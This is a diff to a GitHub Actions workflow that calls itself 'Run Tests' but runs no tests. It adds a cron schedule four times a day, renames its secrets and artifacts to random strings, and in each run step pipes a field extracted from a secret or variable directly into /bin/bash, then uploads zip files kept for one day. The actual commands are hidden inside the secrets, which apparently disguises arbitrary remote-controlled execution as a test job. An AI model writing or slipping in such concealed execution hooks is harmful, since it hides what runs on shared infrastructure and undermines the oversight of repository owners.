@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,18 +16,14 @@ jobs:
         uses: actions/checkout@v4
       - name: Run
         env:
-          leslq225: ${{ secrets.leslq225 }}
+          ur00: ${{ secrets.ur00 }}
         run: |
-          printf '%s' "$leslq225" | jq -r .gnrl302 | /bin/bash
-          echo $fqxn6824 | jq -r .iofq539 | /bin/bash
-          echo $h001 | jq -r .d44752 | /bin/bash
-          echo $m186 | jq -r .clj63196 | /bin/bash
-          echo $demwc45 | jq -r .kmso87998 | /bin/bash
-          printf '%s' "$tlxk44583" | jq -r .wn72 | /bin/bash
+          printf '%s' "$ur00" | jq -r .r1991 | /bin/bash
+          echo $r257 | jq -r .rm676 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: 3fZeAj1v
+          name: qxDIgJ1S
           path: "*.zip"
           retention-days: 1
